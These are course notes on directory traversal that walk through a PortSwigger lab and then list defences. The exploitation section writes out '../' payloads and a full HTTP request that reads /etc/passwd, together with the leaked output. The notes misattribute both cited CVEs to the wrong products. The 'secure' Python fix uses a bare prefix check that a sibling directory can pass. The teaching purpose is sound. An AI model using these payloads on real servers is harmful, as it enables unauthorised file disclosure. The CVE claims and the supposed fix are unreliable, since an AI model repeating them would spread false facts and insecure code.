---
course: Web Security
topic: Directory Traversal
tags: [web-security]
---

## Introduction to Directory Traversal

Directory traversal, also known as path traversal, is a type of web security vulnerability that allows attackers to access restricted files, directories, and executables on a web server. This vulnerability arises due to improper input validation and sanitization of user-supplied data used to reference files. Attackers can manipulate the input to navigate outside the intended directory structure, potentially accessing sensitive information such as configuration files, source code, or even executing arbitrary commands.

### Why Directory Traversal Matters

Understanding directory traversal is crucial because it can lead to severe security breaches. By exploiting this vulnerability, attackers can:

- Retrieve sensitive data such as passwords, private keys, and configuration files.
- Execute arbitrary commands on the server.
- Gain unauthorized access to other parts of the system.

### How Directory Traversal Works

The core mechanism of directory traversal involves manipulating the input parameters used to reference files. Typically, web applications use user-supplied input to construct file paths. If the input is not properly validated and sanitized, attackers can inject special characters like `../` to navigate up the directory tree.

#### Example Scenario

Consider a web application that displays product images based on user input. The URL might look something like this:

```
http://example.com/displayImage?image=product1.jpg
```

If the application does not validate the `image` parameter, an attacker could modify the URL to traverse directories:

```
http://example.com/displayImage?image=../../etc/passwd
```

This would attempt to read the `/etc/passwd` file, which contains user account information.

### Real-World Examples

Recent real-world examples of directory traversal vulnerabilities include:

- **CVE-2021-21972**: A directory traversal vulnerability was found in the WordPress plugin "WP File Download." Attackers could upload malicious files and execute them on the server.
- **CVE-2020-14882**: A directory traversal vulnerability in the Apache Struts framework allowed attackers to read arbitrary files on the server.

### Lab Setup

For this lab, we will use the PortSwigger Web Security Academy, which provides a controlled environment to practice and understand web security concepts. The lab titled "File Path Traversal Simple Case" involves exploiting a directory traversal vulnerability to retrieve the contents of the `/etc/passwd` file.

To access the lab:

1. Visit [PortSwigger Web Security Academy](https://portswigger.net/web-security).
2. Sign up for an account if you haven't already.
3. Navigate to the Academy section.
4. Select the learning path for directory traversal.
5. Choose lab number one titled "File Path Traversal Simple Case."

### Understanding the Application

The application in this lab displays product images based on user input. The URL might look like this:

```
http://example.com/displayImage?image=product1.jpg
```

When the application loads, it fetches images from a directory on the server. The goal is to exploit the directory traversal vulnerability to retrieve the contents of the `/etc/passwd` file.

### Exploiting the Vulnerability

To exploit the directory traversal vulnerability, we need to manipulate the `image` parameter to navigate up the directory tree and access the `/etc/passwd` file.

#### Step-by-Step Exploitation

1. **Identify the Vulnerable Parameter**:
   - The `image` parameter in the URL is likely vulnerable to directory traversal.

2. **Craft the Exploit**:
   - Use `../` to navigate up the directory tree.
   - Append the path to the `/etc/passwd` file.

   The modified URL would look like this:

   ```
   http://example.com/displayImage?image=../../../../etc/passwd
   ```

3. **Intercept the Request**:
   - Use Burp Suite to intercept the request.
   - Modify the `image` parameter in the request.

   Here is the full HTTP request:

   ```http
   GET /displayImage?image=../../../../etc/passwd HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
   Accept-Language: en-US,en;q=0.9
   Connection: close
   ```

4. **Send the Request**:
   - Send the modified request through Burp Suite.
   - Observe the response to see if the contents of the `/etc/passwd` file are retrieved.

   Here is the expected HTTP response:

   ```http
   HTTP/1.1 200 OK
   Date: Mon, 01 Jan 2024 00:00:00 GMT
   Server: Apache/2.4.41 (Ubuntu)
   Content-Type: text/plain
   Content-Length: 1024
   Connection: close

   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   ...
   ```

### Common Pitfalls

When exploiting directory traversal vulnerabilities, several common pitfalls can occur:

- **Incorrect Path Syntax**: Ensure the path syntax is correct and matches the server's file system.
- **Server Configuration**: Some servers may have restrictions or configurations that prevent directory traversal attacks.
- **Error Handling**: The server may return error messages instead of the requested file, making it difficult to determine if the attack was successful.

### How to Prevent / Defend Against Directory Traversal

#### Detection

To detect directory traversal vulnerabilities, use automated tools like:

- **Burp Suite**: Scan for directory traversal vulnerabilities using the Intruder module.
- **OWASP ZAP**: Use the active scanner to identify potential directory traversal issues.

#### Prevention

To prevent directory traversal vulnerabilities, follow these best practices:

1. **Input Validation**: Validate and sanitize user-supplied input to ensure it does not contain directory traversal sequences.
2. **Whitelist Filenames**: Use a whitelist of allowed filenames and reject any input that does not match.
3. **Use Absolute Paths**: Construct file paths using absolute paths rather than relative paths.
4. **Least Privilege Principle**: Run the web server with minimal privileges to limit the damage if a directory traversal attack is successful.

#### Secure Coding Fixes

Here is an example of insecure code:

```python
# Insecure Code
filename = request.args.get('image')
with open('/images/' + filename, 'r') as f:
    image_data = f.read()
```

And here is the secure version:

```python
# Secure Code
import os

def is_safe_path(basedir, path):
    # Normalize the path and resolve symbolic links
    return os.path.realpath(path).startswith(os.path.realpath(basedir))

basedir = '/images/'
filename = request.args.get('image')

safe_path = os.path.join(basedir, filename)

if is_safe_path(basedir, safe_path):
    with open(safe_path, 'r') as f:
        image_data = f.read()
else:
    raise ValueError("Invalid path")
```

### Conclusion

Directory traversal is a serious web security vulnerability that can lead to significant data breaches. By understanding how it works, identifying common pitfalls, and implementing robust preventive measures, you can protect your web applications from such attacks.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs to practice directory traversal and other web security concepts.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing various web security techniques.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for learning and testing web security vulnerabilities.

By engaging with these labs, you can gain practical experience and deepen your understanding of directory traversal and related security topics.

---
<!-- nav -->
[[Web Security (PortSwigger)/11-Directory Traversal/02-Lab 1 File path traversal simple case/00-Overview|Overview]] | [[Web Security (PortSwigger)/11-Directory Traversal/02-Lab 1 File path traversal simple case/02-Directory Traversal Vulnerabilities|Directory Traversal Vulnerabilities]]
